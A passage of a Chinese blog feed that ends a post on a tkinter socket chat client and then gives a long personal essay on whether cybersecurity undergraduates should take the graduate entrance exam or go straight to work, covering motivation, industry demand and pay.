class="token punctuation">.</span>title<span class="token punctuation">(</span>self<span class="token punctuation">.</span>title<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame <span class="token operator">=</span> <span class="token punctuation">[</span>tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>Frame<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    self<span class="token punctuation">.</span>talk_list <span class="token operator">=</span> Listbox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>root<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>talk_list<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>LEFT<span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>Y<span class="token punctuation">)</span>    <span class="token comment"># self.talk_list.insert(0,'asd')</span>    self<span class="token punctuation">.</span>chatTextScrollBar <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Scrollbar<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatTextScrollBar<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>Y<span class="token punctuation">)</span>    ft <span class="token operator">=</span> tkFont<span class="token punctuation">.</span>Font<span class="token punctuation">(</span>family<span class="token operator">=</span><span class="token string">'Fixdsys'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Listbox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">,</span> font<span class="token operator">=</span>ft<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">[</span><span class="token string">'yscrollcommand'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>chatTextScrollBar<span class="token punctuation">.</span><span class="token builtin">set</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatTextScrollBar<span class="token punctuation">[</span><span class="token string">'command'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>yview<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    label <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    label<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputTextScrollBar <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Scrollbar<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputTextScrollBar<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>Y<span class="token punctuation">)</span>    ft <span class="token operator">=</span> tkFont<span class="token punctuation">.</span>Font<span class="token punctuation">(</span>family<span class="token operator">=</span><span class="token string">'Fixdsys'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">70</span><span class="token punctuation">,</span> height<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> font<span class="token operator">=</span>ft<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>focus_set<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>bind_all<span class="token punctuation">(</span><span class="token string">"&lt;KeyPress-Return>"</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>sendMsgEvent<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">[</span><span class="token string">'yscrollcommand'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>inputTextScrollBar<span class="token punctuation">.</span><span class="token builtin">set</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputTextScrollBar<span class="token punctuation">[</span><span class="token string">'command'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>yview<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>sendButton <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">' 发 送 '</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> command<span class="token operator">=</span>self<span class="token punctuation">.</span>senddata<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>sendButton<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTTOM <span class="token keyword">and</span> tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>closeButton <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">' 关 闭 '</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> command<span class="token operator">=</span>self<span class="token punctuation">.</span>close<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>closeButton<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> side<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>RIGHT<span class="token punctuation">,</span> padx<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span> pady<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>frame<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pack<span class="token punctuation">(</span>expand<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>tkinter<span class="token punctuation">.</span>BOTH<span class="token punctuation">)</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>recvdata<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'recvdata'</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在实现登录和发送信息功能时，借助了sendMsgEvent()函数，关键代码为：  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sendMsgEvent</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> event<span class="token punctuation">.</span>keysym <span class="token operator">==</span> <span class="token string">"Return"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>is_login <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>login_socket<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>senddata<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在实现发送数据和接收数据功能时，借助了senddata()和recvdata()函数，关键代码为： </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">senddata</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    message <span class="token operator">=</span> self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'1.0'</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>    theTime <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    new_message <span class="token operator">=</span> <span class="token string">'['</span> <span class="token operator">+</span> theTime <span class="token operator">+</span> <span class="token string">'] '</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>username_data    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> new_message<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' \n'</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>itemconfig<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">'green'</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string">'  '</span> <span class="token operator">+</span> message<span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>see<span class="token punctuation">(</span>END<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>inputText<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> message<span class="token punctuation">.</span>__len__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">recvdata</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        theTime <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        message <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        new_message <span class="token operator">=</span> message<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span>   new_message<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">' ['</span> <span class="token operator">+</span> theTime <span class="token operator">+</span> <span class="token string">'] ：\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>itemconfig<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> fg<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string">'  '</span> <span class="token operator">+</span> new_message<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>chatText<span class="token punctuation">.</span>see<span class="token punctuation">(</span>END<span class="token punctuation">)</span></code></pre><p>在实现关闭程序时，借助了close()函数，关键代码为： </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">close</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="回顾与展望"><a href="#回顾与展望" class="headerlink" title="回顾与展望"></a>回顾与展望</h3><p>通过本项目使我的代码能力和纠错能力得到了进一步提升，尤其是在独立面对困难和程序bug的时候多多调试就可以解决问题，并且记录下来，这样对我的学习非常有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> Programme </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于考研</title>
      <link href="article/postgraduate/"/>
      <url>article/postgraduate/</url>
      
        <content type="html"><![CDATA[<p>也许这是每个大学生都会面对的吧</p><p>长篇文字预警</p><span id="more"></span><p>作者：<a href="https://err0r.top/">https://err0r.top/</a></p><h2 id="前言·Introduce"><a href="#前言·Introduce" class="headerlink" title="前言·Introduce"></a>前言·Introduce</h2><p>又是半载春秋，俺已经进入大学两年半了，经常有人问“到底要不要考研？”，“你准不准备考研？”种种，如今网安形势还算不错，前几天的log4j至少能让一部分人免于被裁23333，就来谈谈自己的看法和想法吧。往往一谈到考研就会很emo，话题也不由得变得沉重，所以偷偷看看，晚上感性地思考，白天理性地决定(开玩笑)。</p><p><del>说实话，我是没有考研的想法的，一句话，实力不够，考不上。</del>经过深入了解后，有点变化，下面道来。</p><p>我一直觉得干技术吃这口饭要的是实践经历，工作经验和技术水平。学校教的理论和基础知识与实践几乎没多大关系，或者说只有教学大纲那么多的知识，这与个人学校还有教师都离不开关系，这些也是身边大部分人的想法。</p><p>就我本人而言，证书拿了不少，成绩也还算可以，按照前辈的情况去找个不错的工作是不成问题的，主要在于个人，其实只要在校认真学习，课外不要天天王者吃鸡，自己研究研究代码等，就已经超出同届学生很多了。</p><p>个人觉得首先对自己有个明确的定位，对自己的未来有个规划，对考研的情况有所了解，综合之后再做决定才是最佳选择。</p><h2 id="因素·Factor"><a href="#因素·Factor" class="headerlink" title="因素·Factor"></a>因素·Factor</h2><h3 id="工作-or-考研"><a href="#工作-or-考研" class="headerlink" title="工作 or 考研"></a>工作 or 考研</h3><p>当前社会可能对于学历的要求越来越高，尤其是国企，当然这是社会上普遍的想法。每年秋季三大热潮，入学潮，面试潮，考研潮，就个人经历，目前大三上课，课间已经有多次校内合作考研机构来班上宣传，加上家里长辈的催促，极其容易让人产生大学毕业必须考研的想法。</p><p>求仁得仁，求志得志。人与人之间，所处环境不同导致观念不同进而导致选择不同。在写这篇文章前我咨询了很多师傅，有师傅说他工作一年以后确实有点后悔没有考研，出于自我提升，尤其对于专业知识的热爱引发的钻研，很热爱自己的领域学习，是考研的最佳动力。</p><h3 id="学习动力哪里来"><a href="#学习动力哪里来" class="headerlink" title="学习动力哪里来"></a>学习动力哪里来</h3><p>根据延迟满足能力的差别，人可以分为两类：一类人延迟满足能力较强，我们把这类人叫做目标驱动型；另一类人延迟满足能力较弱，我们把这类人叫做任务驱动型。</p><h4 id="目标驱动型"><a href="#目标驱动型" class="headerlink" title="目标驱动型"></a>目标驱动型</h4><p>目标驱动型的人可以盯着一个需要几年努力才能实现的目标努力，比如高考，考研。说到目标驱动型，不得不说至少高中都是天天这样强调的，<del>拼搏百天，我要上xxxxxxxx大学，</del>任何一件事，如果对你很重要，你大脑里自然会给它排很高的优先级，你的感觉会告诉你这个事情要抓紧完成。这时候，你自然希望一鼓作气把这个事情做完。只是，有的事情给你的心里负担太重了，你不愿意开始。所以，要制定一系列小目标，是为了拿掉你的心里负担，引导你很容易的进入状态，一步一步前进。</p><p>在写这篇文章前，我只是想完成这篇文章，但写这样一篇文章非常不容易，要兼顾各方面，还怕被人骂…然后再进一步发现，这篇文章所需要的铺垫太多了，从构思到完成这篇文章花了半个多月。我询问了身边十几位熟悉的朋友，采访了很多大师傅，发现有点麻烦，又做了份问卷分发，收回数据分析，再敲定写文章，有时候时间不够第二天接着写，就会恍惚，会容易胡思乱想，所以下面可能会看出来文风明显不同，这也是目标驱动型存在的问题。不自觉的想停下来胡思乱想，做些于完成目标毫无益处的事情，也就是休闲。最糟糕的是，休闲的时候，伴随着一些罪恶感，觉得在浪费时间。这样的后果就是：休闲的时候惦记着做事，做事的时候又想去休闲，都不快乐，都没有做好。</p><p>举个可能不恰当的例子，说白了目标驱动就是考完试不告诉你成绩，期末再公布。任务驱动型就是考完试直接出成绩。</p><h4 id="任务驱动型"><a href="#任务驱动型" class="headerlink" title="任务驱动型"></a>任务驱动型</h4><p>现在大学教育基本都是任务驱动型教育，当然大部分人也习惯了任务驱动型学习。“任务”是生活的基本形态，这个任务包含了三点：有意思，有意义和有可能。</p><p>在大学生活里，尤其是计算机学院的，往往都有n门课设(这里不是说其他学院没有)，很多课设，给了很多要求，要你去实现目标，但是老师基本上已经给你规划好了，所以最后基本上跟着做总能完成。而大创(大学生创新创业项目)就不同了，很多目标都是一个朦胧的影子，如果你是任务驱动型的，想做一件重要事，就最好提前问自己三个问题：</p><blockquote><ol><li>我喜不喜欢这件事?</li><li>(宏观上)这件事对我重不重要?</li><li>(尽力后)这件事我能不能做到?</li></ol></blockquote><p>从理论落实到现实，把知识落地到具体任务，学习起来，才会会更真实，更有动力。</p><h3 id="计算机专业-特殊专业？"><a href="#计算机专业-特殊专业？" class="headerlink" title="计算机专业 特殊专业？"></a>计算机专业 特殊专业？</h3><p>技术圈其实一直是一个特别的圈子，就比如说修车工人，计算机码农和修车工人又有什么区别呢？归根到底都是靠技术吃饭，除非是研究新的工具或者研究新的系统。大部分人来说都是一样的，更可以说，网安专业和其他专业有着完全不同的区别，这也是长辈们和圈外人不理解的一点。“凭什么一个大专出身的小伙子就能拿年薪上百万，而外面博士硕士还找不到工作？”至少在现阶段本科期间，其他专业没法通过除学历外更加强有力的标志来证明个人的能力，但计算机专业不同，计算机类专业除了学历外还可以通过技术水平来判断个人能力，计算机类很多学科竞赛，算法&#x2F;编程&#x2F;安全&#x2F;计算等等都可以证明这类人的能力。所以说技术水平才是决定这类人的上限而不是学历，这也是“师傅”尊称的由来，靠技术吃饭。</p><h3 id="行业现状"><a href="#行业现状" class="headerlink" title="行业现状"></a>行业现状</h3><p>安全行业整体起步才没几年，多数企业因为资源投入和建设时间原因导致覆盖面和深入度都不够，这其中甚至包括一些国内大厂，并没有想象的那么安全。大部分厂商的安全水平仅能应付一些白帽子级别，针对专业黑客团伙持续定向攻击，基本上都不能防御住。</p><p>安全是一个小圈子，圈内事件传播十分迅速，比如哪家企业数据库泄露、哪家业务活动被薅羊毛、哪个安全人被抓、哪个企业遭到了什么处罚等负面新闻。圈内人能够很快了解到行业新技术、新方向、新政策，能够很容易了解到每家公司的安全建设情况。你能了解到阿里安全与线下公安配合的手段之强，也能认识到腾讯的SRC如何能够运营的的这么好，更能和百度的安全人讨论如何让机器学习赋能安全产品，这一切场景在安全圈内的实现都非常容易。众多安全会议的举办也能让你学习到每家公司的经验，无需自己摸索、闭门造车。这都是小圈子的好处。当然弊端也很明显，总有一些人搞所谓的“圈子文化”，混迹于各种安全会议主动认识圈内人（当然这里不是指各家SRC运营的同学，这些是运营同学的工作一部分）。结识所谓圈内人如果出于交流技术的目的也能理解，但这些人仅仅是加上微信，发送一条打招呼的自我介绍后就再也不会有任何有意义的交流。妄图以这样的方式让自己进入圈子中心，真是离谱，这也是外行所看的“安全娱乐圈”。</p><h3 id="人才缺口"><a href="#人才缺口" class="headerlink" title="人才缺口"></a>人才缺口</h3><p>现在市面上都知道计算机专业的优势，未来是数据的时代，区块链，元宇宙，近年的扩招和宣传使得大量人涌入计算机专业。我曾问过班上一位同学为什么要读这个专业，他直接回复我因为听说这个专业赚钱多。慢慢的开始趋于饱和，很多人一听到计算机就觉得是搞算法的，其实不然，这就是网安专业新兴的地方。当然也不是说网安专业就不搞算法，近几年网安专业开始推动，很多院校才获批此专业，<small><del>比如我们学校天天吹(非贬义)全省第三家获批网安专业</del></small>其实是很强的，这里开个玩笑。网安专业属于<strong>特殊技术专业</strong>，高水平人才很难培养，而且社会需求极大（感谢log4j2又救活一批安全工程师），国家认可度提升，综上所述产生了很多<strong>专业红利</strong>。</p><p>互联网大厂<strong>大部分</strong>目前对于安全岗没有很高的学历要求，目前<strong>专业红利</strong>还在，而且大厂安全部门很难找到符合条件的网安人才，只要你技术水平优秀即使是本科学历，加上目前多方内推渠道，很容易就能通过简历筛选进入面试，而技术水平过硬但本科院校不太好的同学基本上只要通过简历筛选就已经成功了，所以技术大佬根本不需要担心院校较差的问题，而且很多大厂的定薪都是根据面试表现来的。了解到薪资等级在某网上称作白菜，sp，ssp三种，而本科生和研究生标准其实一样，并不会因为学历而提高或降低，还是以技术说话。</p><p>讲点实际的，应届信安专业优秀本科生能拿到<strong>每月</strong>20k-35k（数字没有打错，当然这里面有很多行业内卷的因素，一些公司的招聘策略是入职即巅峰，后面薪资就不怎么涨了），努力工作三四年的能拿到40k每月，做到安全团队管理者后能拿到百万年薪，做到行业顶尖能拿到千万年薪。</p><p>有这样的缺口好处是会有更多的人投身于安全，当然坏处也很明显，人员空缺与岗位的紧急程度导致存在大量能力良莠不齐的人在行业内浑水摸鱼，明显的特征是你跟他聊技术细节他跟你聊推进落地，你跟他聊推进落地他跟你聊方向把控，你跟他聊方向把控他跟你聊团队管理，你跟他聊团队管理他跟你聊行业空间，如果这些方面都能聊一点那也行，更多人是答非所问或者看似句句在理实际空洞无物，更有甚者，不知在何处听到的理论还没消化完毕，就拿出来班门弄斧。虽然这么说会得罪一部分人。有人问难道入职后不能衡量出来吗？正常老板不懂的情况下，还真不能衡量出来，主要是因为前面讲到的安全水位难以衡量，而实际的安全风险都是小概率事件。</p><p>很多事情是有因果关系的，前面讲到的良莠不齐的根因在于很难通过结果来判断安全建设的水位。很多团队的KPI是不出安全事故——当然什么事都不做也不会出安全事故，于是造就了吹嘘拍马之人的风生水起。</p><h3 id="“应用型”本科"><a href="#“应用型”本科" class="headerlink" title="“应用型”本科"></a>“应用型”本科</h3><p>所以就在校内外战队还有认识的大部分师傅都是早早就开始实习工作，早点积累工作经验，为提升自己技术水平而成长。目前国内大学教育于实践严重脱节，虽说近几年教育开始改革但目前很难看出成效。就我们校网安专业而言，20级是第一批网安专业，目前专业课程对于实践知识的教育少之甚少，目前还没有大三课程所以无法点评，也许是大一大二为打两年基础。以我个人网络工程专业举例，我届安排个人觉得不是太合理，大三上直接塞三门语言课，网络工程在大三教华为eNSP组网，最后课设要求合理规划并配置一个学校内网，以课内基础内容来组大型网络，书上的内容实在太少，专业知识几乎来自自学。</p><p>也许是我们高校“应用型”大学的培养，对于网络安全的教育更是纸上谈兵，我希望未来我们的学校能够发展得更好。很多学校的技术佬在大三甚至大二就开始了实习<del>(现在还有初中生小学生组卷CTF，太离谱了hhhh)</del>，目的就是趁早接触专业实践的内容。</p><p>6L+Z6YeM5bCx5LiN5o+Q5bWM5YWl5byP5LiT5Lia5LqG77yM5omA6LCT5bWM5YWl5byP5bCx5piv5q+P5bm05aSa5Lqk5Yeg5Y2D5a2m6LS55aSn5Zub57uZ5L2g5Y675p+Q5ZCI5L2c5YWs5Y+45b2T5Yqz5bel77yM546v5aKD6L6D5beu77yM5bel6LWE5bCx5piv55m96I+c6YO95LiN5aaC6YKj56eN77yM576O5ZCN5YW25puw56ev57Sv57uP6aqM77yM5a6e6ZmF5bCx5piv5buJ5Lu35Yqz5Yqo5Yqb44CC</p><p>据字节论坛是否读研帖子下高赞回帖，本科生和研究生定薪标准是一样的，而本科开始工作的话，在其他同学研究生毕业时已经拥有至少三年的工作经验，对于互联网厂来说，三年工作经验无论是跳槽或者调薪（大部分厂一年1-2调）足以让自己的薪水提至少一半，并且在步入社会一段时间后，<strong>基本</strong>没人会关注你的院校，而是关注你的<strong>工作经验</strong>，做过的<strong>项目</strong>等。</p><h3 id="专业红利"><a href="#专业红利" class="headerlink" title="专业红利"></a>专业红利</h3><p>专业红利不仅仅在大厂体现，在体制内也有体现，目前全国各地公安都有对于网安人才的技术人才特招，符合要求的技术人才可以不用考行策，直接技术考核通过就可以进入公安编制。包括一线城市二线城市，而这类特招还很多时候还招不到人。这类单位技术人员基本都是找的外包，本单位技术人员基本上都是之前做过计算机或计算机相关专业掉过去，厉害的技术人员很少，尤其是网安人才，更是这类单位极度渴望的。</p><p>就我之前个人发布的一个问卷，得到的结果是计算机专业工作经验绝对大于学历，毋庸置疑。所以网安专业的特殊性加上目前的专业红利，很多师傅选择本科就毕业直接就业大厂或者进体制都是很不错的。</p><p>安全圈存在很多<strong>无学历或低学历</strong>的牛人，他们年龄可能不大、工龄也短，但往往都是兴趣驱动行动，早期就在安全方面投入了大量时间精力，因此颇有造诣。当长处特别突出时，往往会突破企业的一些要求限制，比如岗位学历要求本科时，候选人突出的安全能力能让这项要求降低。同时也必须正确认识低学历对工作带来的影响，在当前安全行业逐渐细分、安全建设越来越深入的趋势下，安全从业者不再只是会挖漏洞就行。建议低学历候选人尽早通过自考的方式系统的学习英语、数学、计算机基础等学科，并获得国家认可的成人教育学历，届时学历问题的影响就不再会是问题。当然，随着大量院校开设信安专业，越来越多的人进入到安全行业，后续企业招聘安全人才时，学历要求肯定会和其他行业一样成为基础筛选要求。</p><h2 id="形势·Situation"><a href="#形势·Situation" class="headerlink" title="形势·Situation"></a>形势·Situation</h2><p>近几年形势来看，网安考研难度一直小于计算机，但差距在逐步缩小。国家首推网络安全，2022考研形势严峻，一大批网安本科生即将毕业，自从16年以后考研的人数逐年攀升，而计算机、控制、自动化又是工科里的热门专业，在这些学科里还想考重点院校，难度可想而知，所以还是要合理看待考研。以下分析均来自各位师傅，有很多人的意见和看法，我做了很多笔记，在此不能一一列举各位师傅，非常感谢各位师傅提供的帮助。</p><h3 id="分类"><a href="#分类" class="headerlink" 